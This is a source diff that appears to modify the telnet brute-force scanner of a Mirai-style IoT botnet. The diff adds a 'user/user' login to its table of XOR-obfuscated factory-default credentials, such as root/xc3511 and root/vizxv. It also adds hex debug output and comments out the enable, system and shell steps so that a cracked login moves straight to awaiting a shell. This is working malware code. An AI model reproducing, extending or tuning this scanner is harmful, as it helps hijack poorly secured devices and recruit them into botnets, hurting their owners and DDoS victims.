@@ -184,6 +184,10 @@ static int consume_iacs(struct scanner_connection *conn)
                 }
 
                 send(conn->fd, ptr, 3, MSG_NOSIGNAL);
+                printf("send: ");
+                for (int c = 0; c < 3; ++c)
+                    printf("%02x ", ptr[c] & 0xff);
+                printf("\n");
                 ptr += 3;
                 consumed += 3;
             }
@@ -412,6 +416,7 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
 void setup_auth(void)
 {
     // Set up passwords
+    add_auth_entry("\x57\x51\x47\x50\x22", "\x57\x51\x47\x50\x22", 10);                                        // user     user
     add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                                        // root     xc3511
     add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                                             // root     vizxv
     add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                                             // root     admin
@@ -585,7 +590,7 @@ void attack_auth_auth_start(void)
                 n = recvfrom(rsck, dgram, sizeof(dgram), MSG_NOSIGNAL, NULL, NULL);
                 if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                     break;
-                printf("%s\n", (char *)(tcph + 1));
+
                 if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                     continue;
                 if (iph->daddr != LOCAL_ADDR)
@@ -802,66 +807,67 @@ void attack_auth_auth_start(void)
                             send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);
                             send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
 
-                            conn->state = SC_WAITING_PASSWD_RESP;
-                        }
-                        break;
-                    case SC_WAITING_PASSWD_RESP:
-                        if ((consumed = consume_any_prompt(conn)) > 0)
-                        {
-                            char *tmp_str;
-                            int tmp_len;
-
-#ifdef DEBUG
-                            printf("[auth attack] FD%d received shell prompt\n", conn->fd);
-#endif
-
-                            // Send enable / system / shell / sh to session to drop into shell if needed
-                            table_unlock_val(TABLE_SCAN_ENABLE);
-                            tmp_str = table_retrieve_val(TABLE_SCAN_ENABLE, &tmp_len);
-                            send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
-                            send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
-                            table_lock_val(TABLE_SCAN_ENABLE);
-                            conn->state = SC_WAITING_ENABLE_RESP;
-                        }
-                        break;
-                    case SC_WAITING_ENABLE_RESP:
-                        if ((consumed = consume_any_prompt(conn)) > 0)
-                        {
-                            char *tmp_str;
-                            int tmp_len;
-
-#ifdef DEBUG
-                            printf("[auth attack] FD%d received sh prompt\n", conn->fd);
-#endif
-
-                            table_unlock_val(TABLE_SCAN_SYSTEM);
-                            tmp_str = table_retrieve_val(TABLE_SCAN_SYSTEM, &tmp_len);
-                            send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
-                            send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
-                            table_lock_val(TABLE_SCAN_SYSTEM);
-
-                            conn->state = SC_WAITING_SYSTEM_RESP;
-                        }
-                        break;
-                    case SC_WAITING_SYSTEM_RESP:
-                        if ((consumed = consume_any_prompt(conn)) > 0)
-                        {
-                            char *tmp_str;
-                            int tmp_len;
-
-#ifdef DEBUG
-                            printf("[auth attack] FD%d received sh prompt\n", conn->fd);
-#endif
-
-                            table_unlock_val(TABLE_SCAN_SHELL);
-                            tmp_str = table_retrieve_val(TABLE_SCAN_SHELL, &tmp_len);
-                            send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
-                            send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
-                            table_lock_val(TABLE_SCAN_SHELL);
-
                             conn->state = SC_WAITING_SHELL_RESP;
+                            // conn->state = SC_WAITING_PASSWD_RESP;
                         }
                         break;
+//                     case SC_WAITING_PASSWD_RESP:
+//                         if ((consumed = consume_any_prompt(conn)) > 0)
+//                         {
+//                             char *tmp_str;
+//                             int tmp_len;
+
+// #ifdef DEBUG
+//                             printf("[auth attack] FD%d received shell prompt\n", conn->fd);
+// #endif
+
+//                             // Send enable / system / shell / sh to session to drop into shell if needed
+//                             table_unlock_val(TABLE_SCAN_ENABLE);
+//                             tmp_str = table_retrieve_val(TABLE_SCAN_ENABLE, &tmp_len);
+//                             send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
+//                             send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
+//                             table_lock_val(TABLE_SCAN_ENABLE);
+//                             conn->state = SC_WAITING_ENABLE_RESP;
+//                         }
+//                         break;
+//                     case SC_WAITING_ENABLE_RESP:
+//                         if ((consumed = consume_any_prompt(conn)) > 0)
+//                         {
+//                             char *tmp_str;
+//                             int tmp_len;
+
+// #ifdef DEBUG
+//                             printf("[auth attack] FD%d received sh prompt\n", conn->fd);
+// #endif
+
+//                             table_unlock_val(TABLE_SCAN_SYSTEM);
+//                             tmp_str = table_retrieve_val(TABLE_SCAN_SYSTEM, &tmp_len);
+//                             send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
+//                             send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
+//                             table_lock_val(TABLE_SCAN_SYSTEM);
+
+//                             conn->state = SC_WAITING_SYSTEM_RESP;
+//                         }
+//                         break;
+//                     case SC_WAITING_SYSTEM_RESP:
+//                         if ((consumed = consume_any_prompt(conn)) > 0)
+//                         {
+//                             char *tmp_str;
+//                             int tmp_len;
+
+// #ifdef DEBUG
+//                             printf("[auth attack] FD%d received sh prompt\n", conn->fd);
+// #endif
+
+//                             table_unlock_val(TABLE_SCAN_SHELL);
+//                             tmp_str = table_retrieve_val(TABLE_SCAN_SHELL, &tmp_len);
+//                             send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
+//                             send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
+//                             table_lock_val(TABLE_SCAN_SHELL);
+
+//                             conn->state = SC_WAITING_SHELL_RESP;
+//                         }
+//                         break;
                     case SC_WAITING_SHELL_RESP:
                         if ((consumed = consume_any_prompt(conn)) > 0)
                         {
